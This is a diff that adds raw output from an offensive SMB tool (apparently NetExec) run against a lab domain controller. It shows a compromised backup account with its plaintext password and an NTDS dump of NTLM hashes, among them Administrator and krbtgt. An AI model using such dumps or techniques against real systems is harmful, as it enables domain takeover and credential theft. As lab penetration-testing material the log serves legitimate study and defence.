@@ -1,0 +1,11 @@
+SMB         10.10.20.10     445    LABDC            [*] Windows Server 2019 Build 17763 x64 (name:LABDC) (domain:lab-01.local) (signing:True) (SMBv1:False)
+SMB         10.10.20.10     445    LABDC            [+] lab-01.local\backup.ops:Backup2026! (Pwn3d!)
+SMB         10.10.20.10     445    LABDC            [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.10.20.10     445    LABDC            Administrator:500:aad3b435b51404eeaad3b435b51404ee:c5d73fd255b69aad0b8be3420b2b03c8:::
+SMB         10.10.20.10     445    LABDC            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.20.10     445    LABDC            krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4b3c1d9e8a7f60521c3e9d8b7a6f5e41:::
+SMB         10.10.20.10     445    LABDC            lab-01.local\backup.ops:1104:aad3b435b51404eeaad3b435b51404ee:da7a868ae3207455a709066b8fdab1f6:::
+SMB         10.10.20.10     445    LABDC            LABDC$:1000:aad3b435b51404eeaad3b435b51404ee:9e2f1c7b4a3d8e6f0c5b2a1d7e9f3c84:::
+SMB         10.10.20.10     445    LABDC            [+] Dumped 5 NTDS hashes to /root/.nxc/logs/LABDC_10.10.20.10_2026-10-15_120000.ntds of which 3 were added to the database
+SMB         10.10.20.10     445    LABDC            [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         10.10.20.10     445    LABDC            [*] grep -iv disabled /root/.nxc/logs/LABDC_10.10.20.10_2026-10-15_120000.ntds | cut -d ':' -f1
